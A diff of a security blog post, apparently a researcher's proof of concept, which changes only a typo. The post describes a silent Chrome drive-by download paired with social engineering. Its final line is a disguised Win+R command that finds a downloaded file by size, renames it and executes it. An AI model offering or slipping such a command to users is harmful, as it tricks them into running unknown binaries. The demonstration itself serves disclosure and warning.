@@ -4,7 +4,7 @@ title: Don't run commands you don't really understand
 comments: true
 ---
 
-This demonstrates a fully silent drive-by download in Google Chrome (rather similar to CVE-2011-0611, but without the automatic execution part), well as some social engineering magic: a PoC binary will execute if the below seemingly harmless command line is entered in a **Win+R** prompt on a Windows system. Note that you may need to wait for a few seconds before the fun starts.
+This demonstrates a fully silent drive-by download in Google Chrome (rather similar to CVE-2011-0611, but without the automatic execution part), as well as some social engineering magic: a PoC binary will execute if the below seemingly harmless command line is entered in a **Win+R** prompt on a Windows system. Note that you may need to wait for a few seconds before the fun starts.
 
 <pre>
 cmd /c for /r %g in (*_*) do if %~zg==23456 copy /y "%g" "%g.log" & "%g.log"
